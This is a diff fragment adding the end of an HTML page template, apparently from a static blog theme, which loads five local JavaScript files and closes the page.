+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v="></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v="></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v="></script>
+<script type="text/javascript" src="/js/src/post-details.js?v="></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v="></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
